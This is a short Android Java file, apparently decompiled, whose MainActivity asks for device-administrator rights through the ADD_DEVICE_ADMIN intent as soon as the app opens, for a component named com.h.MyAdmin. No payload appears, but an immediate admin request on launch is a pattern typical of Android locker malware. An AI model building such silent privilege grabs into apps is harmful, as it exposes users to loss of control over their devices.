package com.h;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import defpackage.LogCatBroadcaster;

public class MainActivity extends Activity {

    private void activiteDevice() {
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        try {
            intent.putExtra("android.app.extra.DEVICE_ADMIN", new ComponentName(this, Class.forName("com.h.MyAdmin")));
            startActivityForResult(intent, 0);
        } catch (Throwable e) {
            throw new NoClassDefFoundError(e.getMessage());
        }
    }

    @Override
    public void onCreate(Bundle bundle) {
        LogCatBroadcaster.start(this);
        super.onCreate(bundle);
        activiteDevice();
    }
}
